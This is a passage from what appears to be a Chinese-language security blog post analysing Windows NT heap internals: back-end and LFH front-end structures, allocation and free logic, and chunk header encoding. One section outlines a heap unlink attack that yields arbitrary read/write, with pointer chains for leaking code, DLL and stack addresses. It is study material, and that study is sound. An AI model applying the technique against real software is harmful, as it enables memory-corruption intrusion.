UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>字段很多, 同样只关注部分</p><ul><li><code>EncodeFlagMask</code>, 用来标志是否要encode该heap中的chunk头, 0x100000表示需要encode</li><li><code>Encoding</code>, 用来和chunk头进行xor的cookie</li><li><code>VirtualAllocdBlocks</code>, 一个双向链表的dummy head, 存放着<code>Flink</code>和<code>Blink</code>, 将VirtualAllocate出来的chunk链接起来</li><li><code>BlocksIndex</code>, 指向一个<code>_HEAP_LIST_LOOKUP</code>结构, 是backend管理的重要结构体</li><li><code>FreeList</code>, 一个双向链表的dummy head, 同样存放着<code>Flink</code>和<code>Blink</code>, 将所有的freed chunk给链起来, 可以理解为unsorted bin, 但链表是<strong>有序</strong>的</li><li><code>FrontEndHeap</code>, 指向管理Front-End heap的结构体</li><li><code>FrontEndHeapUsageData</code>, 一个对应各个大小chunk的数组, 该数组记录各种大小chunk使用的次数, 达到一定数值的时候就会启用Front-End</li><li><code>FrontEndHeapStatusBitmap</code>, 标识某个大小的chunk是否有启用LFH</li></ul><h5 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h5><p>(BlocksIndex)_HEAP_LIST_LOOKUP是后端的一个重要结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><ul><li><code>ExtendedLookup</code>, 指向下一个ExtendedLookup, 通常下一个会管理更大的chunk</li><li><code>ArraySize</code>, 当前结构管理的最大chunk的大小, 同样右移4位, 第一个通常是是<code>0x800 &gt;&gt; 4</code></li><li><code>ItemCount</code>, 目前管理的chunk数目</li><li><code>OutOfRangeItems</code>, 超出该结构所管理大小的chunk数目</li><li><code>BaseIndex</code>, 该结构所管理的chunk的起始index, 用来从ListHint中找到合适大小的freed chunk用的</li><li><code>ListHead</code>, 指向Freelist的dummy head</li><li><code>ListsInUseUlong</code>, 用于判断ListHint中是否有合适大小的chunk的bitmap</li><li><code>ListHints</code>, 用来指向对应大小的chunk array, 该array以0x10大小为间隔, 存放一个对应size的freed chunk的地址, 用于快速找到合适大小的chunk, 可以类比linux ptmalloc的tcache bin, 只不过chunk的组织仍然通过双向链表维护</li></ul><p>到这里就可以贴一张图了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-20_224215.png" alt=""></p><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><p>看完结构体, 接下来就开始分析分配的机制, 分配的主要逻辑是在<strong>RtlpAllocateHeap</strong></p><p>根据分配的大小, 有三种不同的分配路径</p><ul><li><strong>case1</strong>: <code>size &lt;= 0x4000</code></li><li><strong>case2</strong>: <code>0x4000 &lt; size &lt;= 0xff000</code></li><li><strong>case3</strong>: <code>size &gt; 0xff000</code></li></ul><h5 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h5><ol><li>判断该size对应的FrontEndHeapStatusBitmap是否有启用LFH<ul><li>如果未开启:<ol><li>在size对应的<code>FrontEndHeapUsageData += 0x21</code></li><li>再次判断<code>FrontEndHeapUsageData &gt; 0xff00 || FrontEndHeapUsageData &amp; 0x1f &gt; 0x10</code>是否成立, 成立则启用LFH</li></ol></li></ul></li><li>进入BlocksIndex中查看对应的ListHint是否有可用freed chunk<ul><li>如果存在size刚好合适的<ol><li>取走该chunk, 并且查看其Flink所连接的chunk大小是否与之相同, 如果相同, 那么对应LIstHint更为Flink, 否则置零对应ListHint</li><li>将这个chunk从FreeList中unlink, 并返回给使用者(会将header xor回正常状态)</li></ol></li><li>如果没有刚好合适的, 但有更大size的<ol><li>优先找最接近所需要size的, 有则按上述相同方法进行取出</li><li>对chunk进行切割, 剩下的再次加入FreeList, 如果可以放入ListHint则放入</li><li>将切割后chunk返回给使用者同时还原header</li></ol></li><li>如果FreeList中没有能够使用的chunk<ol><li>尝试ExtendHeap拓展heap空间</li><li>从拓展出空间的chunk中寻找, 同前两种情况</li></ol></li></ul></li></ol><h5 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h5><p>除了没有LFH相关操作, 其余与case1一致</p><h5 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h5><p><code>0xff000</code>其实也就是_HEAP结构的<code>VirtualMemoryThreshold &lt;&lt; 4</code></p><p>根据这个字段的名称可以知道, 这个大小就是使用VirtualAlloc的临界大小</p><ol><li>直接使用ZwAllocateVirtualMemory得到类似mmap出的一大块内存</li><li>将该内存块插入_HEAP-&gt; VirtualAllocBlocks链表</li><li>并返回给用户使用</li></ol><h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>释放时只分为两种情况</p><ul><li><strong>case1</strong>: <code>size &lt;= 0xff000</code></li><li><strong>case2</strong>: <code>size &gt; 0xff000</code></li></ul><h5 id="case1-1"><a href="#case1-1" class="headerlink" title="case1"></a>case1</h5><ol><li><p>首先检查alignment对齐, 利用unused byte判断chunk状态</p></li><li><p>如果该size未开启LFH, 对应的FrontEndHeapUsageData 减 1</p></li><li><p>判断前后的chunk是否处于空闲状态, 是的话进行合并, 合并时采用unlink, 与之前类似</p></li><li><p>合并完后, 更新合并后chunk的size, 以及后一个chunk的prevsize, 然后查看此时chunk是不是需要在freelist最前跟最后, 是就插入, 否则就从ListHint中插入, 并且update ListHint</p><p>插入时也会对Freelist进行检查, <strong>但是此检查不会触发abort, 原因在于没有做unlink写入</strong></p></li></ol><h5 id="case2-1"><a href="#case2-1" class="headerlink" title="case2"></a>case2</h5><ol><li>检查该chunk的linked list并从<code>_HEAP-&gt;VirtualAllocdBlocks</code>中移除</li><li>接着使用<code>RtlpSecMemFreeVirtualMemory</code>将chunk整个munmap掉</li></ol><h3 id="Back-Exploitation"><a href="#Back-Exploitation" class="headerlink" title="Back-Exploitation"></a>Back-Exploitation</h3><p>主要就是unlink</p><p>其实原理和linux下的unlink几乎一致, 有前者基础的话能够很好地理解相关知识</p><p>需要注意两点</p><ol><li><p>decode header进行check的时候, 需要保证其正确性, 比如找到previous freed chunk, 进行decode以及check的操作的时候</p></li><li><p>chunk的Flink和Blink直接指向数据区域而不是chunk header, 不用伪造fake chunk的步骤</p><p>设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(Flink + 0x8) = chunk_addr</span><br><span class="line">*(Blink) = chunk_addr</span><br></pre></td></tr></table></figure></li></ol><p>整体利用思路</p><ol><li>在已知linux下unlink attack的基础上, 以完全相同的方式，对windows heap进行unlink attack, 可以实现将一个指针指向本身的效果</li><li>利用这个指向自身的指针, 可以控制周围的可能的指针, 达到任意地址读写的效果</li><li>不管如何利用, 总是需要先leak得到各类信息<ul><li>代码地址<ul><li><code>PEB --&gt; text</code></li></ul></li><li>共享库地址<ul><li><code>text --&gt; IAT --&gt; xxx.dll --&gt; xxx.dll</code></li><li><code>_HEAP-&gt;LockVariable.Lock --&gt; ntdll.dll</code></li><li><code>CrticalSection-&gt;DebugInfo --&gt; ntdll.dll</code></li></ul></li><li>栈地址<ul><li><code>Kernel32.dll --&gt; kernelbase.dll --&gt; KERNELBASE!BasepFilterInfo --&gt; stack address</code></li><li><code>kernel32.dll --&gt; ntdll.dll --&gt; ntdll!PebLdr --&gt; PEB --&gt; TEB --&gt; stack address</code></li></ul></li></ul></li></ol><h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front-End"></a>Front-End</h3><h4 id="结构描述-1"><a href="#结构描述-1" class="headerlink" title="结构描述"></a>结构描述</h4><p>这部分的结构体在vergiliusproject找不到</p><h5 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h5><p>在_HEAP中有一个字段FrontEndHeap, 指向一个_LFH_HEAP结构体, 该结构体就是前端最重要的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +<span class="number">0x000</span> Lock             : _RTL_SRWLOCK</span><br><span class="line">   +<span class="number">0x008</span> SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +<span class="number">0x038</span> SegmentCreate    : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> SegmentDelete    : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> MinimumCacheDepth : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> CacheShiftThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> SizeInCache      : Uint8B</span><br><span class="line">   +<span class="number">0x050</span> RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +<span class="number">0x060</span> UserBlockCache   : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +<span class="number">0x2a0</span> MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +<span class="number">0x2a4</span> Buckets          : [<span class="number">129</span>] _HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x4a8</span> SegmentInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x8b0</span> AffinitizedInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0xcb8</span> SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0xcc0</span> LocalData        : [<span class="number">1</span>] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><p>关注几个重要字段</p><ul><li><code>Heap</code>, 指向其对应的<code>_HEAP</code>结构体</li><li><code>Buckets</code>, 一个存放129个<code>_HEAP_BUCKET</code>结构体的数组, 用来寻找配置大小对应到Block大小的阵列结构</li><li><code>SegmentInfoArrays</code>, 一个存放129个<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针的数组, 不同大小对应到不同的<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体, 主要管理对应到的<code>_HEAP_SUBSEGMENT</code>的信息</li><li><code>LocalData</code>, 一个<code>_HEAP_LOCAL_DATA</code>结构体</li></ul><h5 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x000</span> BlockUnits       : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x003</span> UseAffinity      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> DebugFlags       : Pos <span class="number">1</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x003</span> Flags            : UChar</span><br></pre></td></tr></table></figure><p>关注两个部分:</p><ul><li><code>BlockUnits</code>, 要分配出去的一个block的大小, 存放<code>size &gt;&gt; 4</code></li><li><code>SizeIndex</code>, 使用者需要的大小, 存放<code>size &gt;&gt; 4</code></li></ul><h5 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x000</span> LocalData        : Ptr64 _HEAP_LOCAL_DATA</span><br><span class="line">   +<span class="number">0x008</span> ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x010</span> CachedItems      : [<span class="number">16</span>] Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x090</span> SListHeader      : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x0a0</span> Counters         : _HEAP_BUCKET_COUNTERS</span><br><span class="line">   +<span class="number">0x0a8</span> LastOpSequence   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> BucketIndex      : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> LastUsed         : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> NoThrashCount    : Uint2B</span><br></pre></td></tr></table></figure><p>关注:</p><ul><li><p><code>LocalData</code>, 一个<code>_HEAP_LOCAL_DATA</code>结构体指针, 指向<code>_LFH_HEAP-&gt;LocalData</code>, 方便从<code>_HEAP_LOCAL_SEGMENT_INFO</code>找回<code>_LFH_HEAP</code></p></li><li><p><code>BucketIndex</code>, 对应到的<code>BucketIndex</code>, 也就是<code>_LFH_HEAP-&gt;SegmentInfoArrays</code>数组中对应的下标</p></li><li><p><code>ActiveSubsegment</code>, 非常重要的成员, 一个<code>_HEAP_SUBSEGMENT</code>结构体指针</p><p>目的在于管理<code>UserBlocks</code>, 记录剩余等多chunk和该<code>UserBlocks</code>最大分配数等信息</p></li><li><p><code>CachedItems</code>, 存放16个<code>_HEAP_SUBSEGMENT</code>结构体指针的数组, 存放对应到该<code>_HEAP_LOCAL_SEGMENT_INFO</code>且还有可以分配chunk给用户的<code>_HEAP_SUBSEGMENT</code>指针</p><p>可以理解为一个内存池, 当<code>ActiveSubsegment</code>没有可用chunk的时候, 即用完的时候, 就从<code>CachedItems</code>选择填充, 替换<code>ActiveSubsegment</code></p></li></ul><h5 id="HEAP-LOCAL-DATA"><a href="#HEAP-LOCAL-DATA" class="headerlink" title="_HEAP_LOCAL_DATA"></a>_HEAP_LOCAL_DATA</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_LOCAL_DATA</span><br><span class="line">    +<span class="number">0x000</span> DeletedSubSegments : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x010</span> CrtZone          : Ptr64 _LFH_BLOCK_ZONE</span><br><span class="line">    +<span class="number">0x018</span> LowFragHeap      : Ptr64 _LFH_HEAP</span><br><span class="line">    +<span class="number">0x020</span> Sequence         : Uint4B</span><br><span class="line">    +<span class="number">0x024</span> DeleteRateThreshold : Uint4B</span><br></pre></td></tr></table></figure><p>其中<code>LowFragHeap</code>指回<code>_LFH_HEAP</code>结构本身的位置, 通常用来找回LFH</p><h5 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x000</span> LocalInfo        : Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0x008</span> UserBlocks       : Ptr64 _HEAP_USERDATA_HEADER</span><br><span class="line">    +<span class="number">0x010</span> DelayFreeList    : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x020</span> AggregateExchg   : _INTERLOCK_SEQ</span><br><span class="line">    +<span class="number">0x024</span> BlockSize        : Uint2B</span><br><span class="line">    +<span class="number">0x026</span> Flags            : Uint2B</span><br><span class="line">    +<span class="number">0x028</span> BlockCount       : Uint2B</span><br><span class="line">    +<span class="number">0x02a</span> SizeIndex        : UChar</span><br><span class="line">    +<span class="number">0x02b</span> AffinityIndex    : UChar</span><br><span class="line">    +<span class="number">0x024</span> Alignment        : [<span class="number">2</span>] Uint4B</span><br><span class="line">    +<span class="number">0x02c</span> Lock             : Uint4B</span><br><span class="line">    +<span class="number">0x030</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><ul><li><p><code>LocalInfo</code>, 一个指回到对应<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体位置的指针</p></li><li><p><code>UserBlocks</code>, 一个指向<code>_HEAP_USERDATA_HEADER</code>结构的指针, 也就是指向LFH chunk的内存分配池</p><p>该内存分配池包括一个<code>_HEAP_USERDATA_HEADER</code>, 存放一些metatdata</p><p>后面紧跟着要分配出去的所有chunk</p></li><li><p><code>AggregateExchg</code>, 一个<code>_INTERLOCK_SEQ</code>结构, 储存对应的<code>UserBlocks</code>的状态信息</p><p>LFH通过该结构判断是否从该UserBlock分配, 同时具有Lock的作用</p></li><li><p><code>BlockSize</code>, 该<code>UserBlocks</code>中每个chunk的大小</p></li><li><p><code>BlockCount</code>, 该<code>UserBlocks</code>中chunk的总个数</p></li><li><p><code>SizeIndex</code>, 该<code>UserBlocks</code>对应的index</p></li></ul><h5 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">    +<span class="number">0x000</span> Depth            : Uint2B</span><br><span class="line">    +<span class="number">0x002</span> Hint             : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">    +<span class="number">0x002</span> Lock             : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">    +<span class="number">0x002</span> Hint16           : Uint2B</span><br><span class="line">    +<span class="number">0x000</span> Exchg    </span><br></pre></td></tr></table></figure><ul><li><code>Depth</code>, 用来管理对应到的<code>UserBlocks</code>还有多少freed chunk, LFH会用这个判断是否还从该UserBlock进行分配</li><li><code>Lock</code>, 即提供锁的作用, 其实只占用第4 byte的最后一个bit</li></ul><h5 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">    +<span class="number">0x000</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> SubSegment       : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x008</span> Reserved         : Ptr64 Void</span><br><span class="line">    +<span class="number">0x010</span> SizeIndexAndPadding : Uint4B</span><br><span class="line">    +<span class="number">0x010</span> SizeIndex        : UChar</span><br><span class="line">    +<span class="number">0x011</span> GuardPagePresent : UChar</span><br><span class="line">    +<span class="number">0x012</span> PaddingBytes     : Uint2B</span><br><span class="line">    +<span class="number">0x014</span> Signature        : Uint4B</span><br><span class="line">    +<span class="number">0x018</span> EncodedOffsets   : _HEAP_USERDATA_OFFSETS</span><br><span class="line">    +<span class="number">0x020</span> BusyBitmap       : _RTL_BITMAP_EX</span><br><span class="line">    +<span class="number">0x030</span> BitmapData       : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><p>关注: </p><ul><li><code>SubSegment</code>, 指回对应的<code>_HEAP_SUBSEGMENT</code>结构</li><li><code>EncodedOffsets</code>, 一个<code>_HEAP_USERDATA_OFFSETS</code>结构, 用来验证chunk header是否被改过</li><li><code>BusyBitmap</code>, 记录该<code>UserBlocks</code>哪些chunk被使用</li></ul><h5 id="HEAP-ENTRY-1"><a href="#HEAP-ENTRY-1" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><p>前端管理的_HEAP_ENTRY与之前在后端的_HEAP_ENTRY存在差异</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>size</code>, <code>Flags</code>和<code>SmallTagIndex</code>变成了<code>SubSegmentCode</code></p><p>相应含义也发生了变化</p><ul><li><code>SubSegmentCode</code>, encode过的metadata, 用来推回<code>UserBlocks</code>的位置。</li><li><code>PreviousSize</code>, 该chunk在UserBlock中的index, 实际上是第0xD个byte</li><li><code>UnusedBytes</code>, 用来判断该LFH chunk状态<ul><li><code>Freed</code>, 恒为<code>0x80</code></li><li><code>Inused</code>, <code>UnusedBytes &amp; 0x80 != 0</code></li></ul></li></ul><p>在认识了这些结构体之后就可以看这两张图片</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-21_141711.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-21_143955.png" alt=""></p><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p><code>_HEAP_USERDATA_HEADER-&gt;EncodedOffsets</code>在<code>UserBlocks</code>初始化的时候设置, 其算法为下面四个值进行xor: </p><ul><li><code>(sizeof(\_HEAP_USERDATA_HEADER)) | ((_HEAP_BUCKET-&gt;BlockUnits) * 0x10 &lt;&lt; 16)</code></li><li><code>LFHkey</code></li><li><code>UserBlocks</code>的地址</li><li><code>_LFH_HEAP</code>的地址</li></ul><p>所有<code>UserBlocks</code>里的chunk header在初始化的时候都会经过xor, 其算法为下面各个值得xor: </p><ul><li><code>_HEAP</code>的地址</li><li><code>LFHkey</code></li><li><code>chunk</code>本身的地址<code>address &gt;&gt; 4</code></li><li><code>((chunk address) - (UserBLocks address)) &lt;&lt; 12</code></li></ul><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在<code>FrontEndHeapUsageData[x] &amp; 0x1F &gt; 0x10</code>时, 置位<code>_HEAP-&gt;CompatibilityFlag |= 0x20000000</code>, 下一次allocate(也就是第18次)就会启用LFH并初始化</p><ol><li><p>首先会ExtendFrontEndUsageData及增加更大的<code>_HEAP-&gt;BlocksIndex</code></p><p><code>_HEAP-&gt;BlocksIndex</code>可以理解为一个<code>_HEAP_LIST_LOOKUP</code>结构的单向链表, 且默认初始情况下只存在一个管理(max 0x800)的chunk的<code>_HEAP_LIST_LOOKUP</code></p><p>所以这里会扩展到(0x800, 0x4000), 即在链表尾追加一个管理更大chunk的<code>_HEAP_LIST_LOOKUP</code>结构体结点</p></li><li><p>建立并初始化<code>_HEAP-&gt;FrontEndHeap</code>(通过mmap), 即初始化<code>_LFH_HEAP</code>的一些metadata</p></li><li><p>建立并初始化<code>_LFH_HEAP-&gt;SegmentInfoArrays[x]</code>, 在<code>SegmentInfoArrays[BucketIndex]</code>处填上对应的<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针</p></li></ol><p>再之后申请同样大小的chunk就会开始使用LFH</p><ol><li>分配<code>UserBlocks</code>并进行初始化, 即设置对应大小的chunk。</li><li>然后再设置对应<code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</code></li><li>随机地从<code>UserBlocks</code>中返回一个chunk</li></ol><h4 id="分配-1"><a href="#分配-1" class="headerlink" title="分配"></a>分配</h4><p>主要函数逻辑在RtlpLowFragHeapAllocFromContext</p><ol><li><p>先看看ActiveSubsegment中有没有空闲的chunk, 也就是通过<code>ActiveSubsegment-&gt;AggregateExchg.depth</code>判断</p><ul><li>如果没有则从<code>CacheedItems</code>中找, 找到有存在空闲chunk的<code>Subsegment</code>就替换掉当前的<code>ActiveSubsegment</code></li><li>如果有则继续往下</li></ul></li><li><p>取得<code>RtlpLowFragHeapRandomData[x]</code>上的值, 取值是依次循环取的, x为1 byte大小的值, 即下一次<code>x = (x + 1) % 256</code></p><p>由于<code>RtlpLowFragHeapRandomData</code>是一个存放256个随机数的数列(范围为<code>0x0 ~ 0x7F</code>), 所以这里相当于在取随机数</p></li><li><p>计算相应的UserBlocks里chunk的index, 通过<code>RtlpLowFragHeapRandomData[x] * max_index &gt;&gt; 7</code>(max_index是能取到的最大的index)</p><ul><li><p>如果发生了collision, 